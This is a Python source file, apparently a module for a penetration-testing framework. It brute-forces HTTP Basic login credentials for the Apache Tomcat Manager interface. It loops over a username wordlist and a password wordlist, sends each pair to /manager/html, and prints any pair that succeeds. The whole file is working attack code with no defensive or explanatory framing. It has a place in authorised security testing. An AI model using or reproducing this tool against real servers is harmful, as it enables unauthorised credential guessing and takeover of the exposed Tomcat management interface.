import requests
import base64
from core.base_module import BaseModule
from rich.console import Console

class TomcatManagerBruteforce(BaseModule):
    """Bruteforces the Tomcat Manager login page."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address or domain.'],
            'RPORT': [8080, 'The target Tomcat port.'],
            'USER_FILE': ['', 'Path to a file containing usernames.'],
            'PASS_FILE': ['', 'Path to a file containing passwords.']
        }

    def run(self, options):
        """
        Executes the Tomcat Manager bruteforce attack.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        user_file = options.get('USER_FILE')
        pass_file = options.get('PASS_FILE')
        console = Console()

        if not all([rhost, user_file, pass_file]):
            console.print("[!] RHOST, USER_FILE, and PASS_FILE must be set.", style="bold red")
            return

        target_url = f"http://{rhost}:{rport}/manager/html"
        console.print(f"[*] Targeting Tomcat Manager at: {target_url}")

        try:
            with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
                users = [u.strip() for u in uf.readlines()]
                passwords = [p.strip() for p in pf.readlines()]
        except FileNotFoundError as e:
            console.print(f"[!] Error reading file: {e}", style="bold red")
            return

        console.print(f"[*] Starting bruteforce with {len(users)} usernames and {len(passwords)} passwords.")

        for user in users:
            for password in passwords:
                try:
                    # HTTP Basic Authentication
                    auth_str = f"{user}:{password}"
                    auth_bytes = base64.b64encode(auth_str.encode('utf-8'))
                    headers = {'Authorization': f'Basic {auth_bytes.decode("utf-8")}'}

                    response = requests.get(target_url, headers=headers, timeout=5)

                    if response.status_code == 200:
                        console.print(f"[bold green][+] Success! Credentials found![/bold green]")
                        console.print(f"  -> Username: [cyan]{user}[/cyan]")
                        console.print(f"  -> Password: [cyan]{password}[/cyan]")
                        return # Stop after finding valid credentials
                    elif response.status_code == 401:
                        # Unauthorized, continue trying
                        pass
                    elif response.status_code == 403:
                        console.print(f"[yellow][-] Login with {user}:{password} gave 403 Forbidden. Manager may be restricted by IP.", style="yellow")
                    else:
                        console.print(f"[!] Unexpected status code {response.status_code} for {user}:{password}")

                except requests.RequestException:
                    console.print(f"[!] Connection error for {user}:{password}. Skipping.", style="bold red")
        
        console.print("[*] Bruteforce complete. No valid credentials found.")
